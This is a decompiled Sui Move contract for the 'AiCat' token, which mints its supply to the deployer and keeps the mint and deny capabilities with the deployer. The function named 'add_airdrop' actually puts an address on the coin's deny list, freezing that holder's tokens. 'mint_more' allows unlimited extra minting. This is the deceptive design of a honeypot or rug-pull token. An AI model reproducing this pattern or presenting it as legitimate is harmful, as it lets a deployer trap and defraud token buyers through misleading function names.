module 0x3a681c956bf5ff38755f735401b2e97a13ff232d3c7851ebd5e97f55d89786f2::AICAT {
    struct AICAT has drop {
        dummy_field: bool,
    }

    public entry fun add_airdrop(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<AICAT>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<AICAT>(arg0, arg1, arg2, arg3);
    }

    fun init(arg0: AICAT, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<AICAT>(arg0, 6, b"AiCat", b"Ai Cat", b"Ai Cat , the revolutionary Ai https://x.com/Aicat2030", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://pump.mypinata.cloud/ipfs/Qme2i9kzC8CZxsUKqXcbDiT85KJKNKacLiiNhDM4rFtLoB?img-width=256&img-dpr=2&img-onerror=redirect")), false, arg1);
        let v3 = v0;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<AICAT>>(v2);
        0x2::transfer::public_transfer<0x2::coin::Coin<AICAT>>(0x2::coin::mint<AICAT>(&mut v3, 1000000000000000, arg1), 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<AICAT>>(v3, 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<AICAT>>(v1, 0x2::tx_context::sender(arg1));
    }

    public entry fun mint_more(arg0: &mut 0x2::coin::TreasuryCap<AICAT>, arg1: u64, arg2: &mut 0x2::tx_context::TxContext) {
        0x2::transfer::public_transfer<0x2::coin::Coin<AICAT>>(0x2::coin::mint<AICAT>(arg0, arg1, arg2), 0x2::tx_context::sender(arg2));
    }

    public entry fun remove_airdrop(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<AICAT>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<AICAT>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

